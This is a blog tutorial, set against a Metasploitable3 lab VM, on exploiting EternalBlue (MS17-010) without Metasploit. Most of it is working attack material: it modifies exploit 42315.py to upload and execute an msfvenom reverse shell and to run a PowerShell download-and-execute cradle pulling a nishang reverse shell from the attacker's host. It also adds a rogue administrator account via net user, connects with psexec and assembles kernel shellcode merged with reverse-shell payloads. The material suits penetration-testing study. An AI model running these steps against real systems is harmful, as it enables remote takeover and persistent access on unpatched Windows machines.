---
layout: post
title:  "EternalBlue without Metasploit"
date:   2019-10-15 18:05:55 +0300
image:  EternalBlue/title.png
author-name: strik1r
tags:   [EternalBlue, Without Metasploit, Exploit modification]
---

<h2>Prologue:</h2>
I wanted to create a Without Metasploit series. Here we would look and modify famous exploits without using the Metasploit framework. What would be the best way to start then with Eternal Blue?
<h3> Environment </h3>
The easiest way to find an environment to test on, is to get Hack The Box VIP and attack Blue.
Setting up your local vm, try Metasploitable 3 [Metasploitable3](https://github.com/rapid7/metasploitable3)
I will go with the Metasploitable now. For the EternalBlue to work I had to disable the firewall on metasploitable3.
Metasploitable ip: 10.0.2.15

Attacker
There are a few things you need to set up on your attacker machine too. First install pip, then impacket. Attacker IP: 10.0.2.4
```
sudo apt-get update
sudo apt install python-pip
git clone https://github.com/SecureAuthCorp/impacket
cd impacket-master
pip install .
```
<br>
From here it should work just fine.
<h3> The Exploit </h3>
If you do a
```
searchsploit eternalblue
```
<br>
You will get the exploit 42315.py
![searchsploit](/img/EternalBlue/searchspolit.png)
Copy it to our directory

```
searchsploit -m 42315.py
```
<br>
Now let's start to look at what do we have in this file. First we can see the lines:

```
from impacket import smb, smbconnection
from mysmb import MYSMB
```
<br>
We already have impacket but what about mysmb? With a little googleing we can find that too.
```
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```
<br>
Now we can go deeper.

```
USERNAME = ''
PASSWORD = ''
```
<br>
We should change this if we find valid smb credentials. Going a little be down, there is a nicely named function find_named_pipe. This means that we
don't need to run other exploits/scanning to find our named pipes because this is already included in the exploit itself. However checking the first lines
of the function reveals the default pipes that the function will search for.
```
pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr' ]
```
<br>
you can expand this list if you did not succeed for the first try.
<br>
<h4>Sample Request:</h4>
First, let's run it against the target.
![FAIL](/img/EternalBlue/fail.png)
<br>
This did not go very well. No named Pipe was found. We can add more possible named pipe to our list, and give it another try. It failed again. From here we have another option.
If we know valid credentials, then we could try to use it. Adding vagrant/vargrant to the Username Password section.
```
USERNAME = 'vagrant'
PASSWORD = 'vagrant'
```
Running the code it will execute and create C:\pwned.txt on the machine.
![PWNED](/img/EternalBlue/pwned.PNG)
We can log in and check the file. It should be there. That is ok but vagrant is an admin user. If we have credentials then we probably do not need this exploit at all.

<h3> Eternal Blue as Privilege escalation </h3>
Let's create a test user with a test password. User test should not be admin this time. By logging in as a test, you can see that you are unable to create c:\pwned.txt.
![testUser](/img/EternalBlue/test.PNG)
<br>
Adding these credentials to our exploit and running it, will once again create the file pwned.txt This means that we have non-admin credentials but we could still execute commands as admin.
We can see on the included picture that the user test cannot delete the file.
![testUser](/img/EternalBlue/delete.PNG)
<br>
<h3> Modifying the exploit</h3>
In case you can find a working pipe name or use credentials, creating a file on the target machine may not be that useful for us. Let's modify the exploit code to get a reverse shell.
First let's find the exploit in the code. looking in the code, we can find a function called smb_pwn.
```
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    
    print('creating file c:\\pwned.txt on the target')
    tid2 = smbConn.connectTree('C$')
    fid2 = smbConn.createFile(tid2, '/pwned.txt')
    smbConn.closeFile(tid2, fid2)
    smbConn.disconnectTree(tid2)
```
Let's look at it line by line. First line will create a smb connection. This is what we eill use to interact with the machine.
The next line is a print, this will just write a line for us so we know what is currently happening.
Then we will connect to Driver C so we can egn our modification there. This is saved in a variable so in the next line we can finally create a file called pwned.txt.
Finally we will close the connection.
<h3> Upload shell</h3>
Let's create our reverse shell first:
<br>
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=443 -f exe > shell.exe
```
<br>
Then modify the code so it will upload and run our exploit
<br>
```
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    smb_send_file(smbConn, 'shell.exe', 'C', '/test.exe')
    service_exec(conn, r'c:\test.exe')
```
<br>
The function now only has 3 lines. First we create an smb connection. Then we send our exploit to the target, it will be created in C:/test.exe. Then in the last line we will execute our code and get a reverse shell on our machine on port 443.
First let's start a listener on our attacker machine then execute our code.
```
nc-lvnp 443
```
<br>
![UploadExploit](/img/EternalBlue/uploadExploit.PNG)
We can see that the exploit ran and we got back a reverse shell as System.

<h3>To memory</h3>
We got what we wanted. But this is not the best case. We created a file in the system which is detectable. Let's find a better way. We saw that we can execute commands.
With the use of Powershell, we can download things on the machine and execute them while everything will be done in memory.
Let's download the famous nishang powershell shell
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```
Now we have to modify this a little bit. to immediately invoke the reverse shell we should add this line to the end of the file:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.0.2.4 -Port 443
```
This way when the file gets downloaded with powershell, we will immediately call the main function with our ip address and port to connect back to. I also renamed the file to test.ps1
Next we need to download the file with our exploit. For this we only need one line in our function.
```
service_exec(conn, r"cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.0.2.4/test.ps1')")
```
Here we spawn cmd and from there we will call powershell to download and execute the ps1 script that is hosted in our machine. Notice that by adding the extra line to the script, we just need to download the file to get a revers shell.
Finaly we need to host the script somehow. For this go into the folder where the test.ps1 is located and create a http server. For example with:
```
python -m SimpleHTTPServer 80
```
We will need 3 command window for this to work. one to host our server, one for the listener and one which will execute theexploit itself.
![InvokeExploit](/img/EternalBlue/invoke.PNG)
We can see it worked. pulled the file from our server and we got the reverse shell back.
<h3>More sneaky</h3>
What if we do not want to connect back to our machine to download something, or simple we cannot somehow. We can be much more sneaky. Instead of loading in a reverse shell, we can simply create a new administrator.
This way we will have working admin credentials on the machine and we can connect to it with RDP or psexec. Let's take a look.
```
service_exec(conn, r"cmd /c net user attacker2 PassW123 /add")
service_exec(conn, r"cmd /c net localgroup administrators attacker /add")
```
Only these two lines are needed in our function and we already added a new administrator user. You will see errors while executing the command. But no worry it is fine in this case.
![addedUser](/img/EternalBlue/adduser.PNG)
Let's execute psexec from our impacket to connect to the machine as an administrator. Go to impacket/examples then run:
```
python psexec.py attacker:PassW123@10.0.2.15
```
<br>
![psexec](/img/EternalBlue/psexec.PNG)
<br>

<h3> Without Pipe</h3>
We looked at various ways to exploit eternal blue with pipename. But what if whe have no pipe name. We need a way to still exploit it. We have one but it is more likely to crash the target.
To make this work, first we need to clone the full repo of MS17-010 from worawit.
```
git clone https://github.com/worawit/MS17-010.git
cd MS17-010/
```
We will focus on the shellcode first. going into the folder shellcode and reading the file eternalblue_sc_merge.py we can get an idea how to create our shellcode and use it with this exploit.
First we need to assemblée the shell code
```
nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
```
Then we need to create our payload, but this time in raw format. Lest use the same shell, create two versions of them like in the exploit code.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=445 -f raw -o sc_x86_msf.bin EXITFUNC=thread
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=445 -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread
```
We will create our exploit in raw format and add an exit function to try to make a clean exit and minimise the chance of crash.
Now we need to combine our payloads with the created shellcode then merge them.
```
cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
```
We now have our exploit binary. all we have to do is to execute the exploit and wait for our shell.
Going back one folder and executing the exploit, we are getting and error and a reverse shell.
```
cd ..
python eternalblue_exploit7.py 10.0.2.15 ./shellcode/sc_all
```
<br>
![withoutPipe](/img/EternalBlue/final.png)
<h2>Summary:</h2>
We looked at multiple ways to exploit EternalBlue with and without pipename. We created reverse shells and injected our own administrator user.
